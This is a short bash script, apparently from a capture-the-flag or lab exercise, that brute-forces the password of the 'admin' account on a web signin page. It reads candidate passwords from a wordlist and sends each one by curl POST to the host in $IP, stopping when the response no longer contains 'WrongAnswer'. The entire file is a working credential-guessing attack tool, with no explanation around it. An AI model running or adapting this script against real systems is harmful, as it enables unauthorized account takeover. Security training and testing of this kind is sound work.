#!/bin/bash

# COLORS
RESET='\033[0m'
RED='\033[31m'
GREEN='\033[32m'

if [[ $# -eq 0 ]] ; then
    exit 0
fi

while IFS= read -r line
do
	echo -n $line " "

	HTML=$(curl -s -X POST "http://$IP/?page=signin&username=admin&password=$line&Login=Login")

	if [[ "$HTML" != *"WrongAnswer"* ]]; then
		printf "${GREEN}✔${RESET}\n";
		break
	fi

	printf "${RED}✘${RESET}\n";
done < "$1"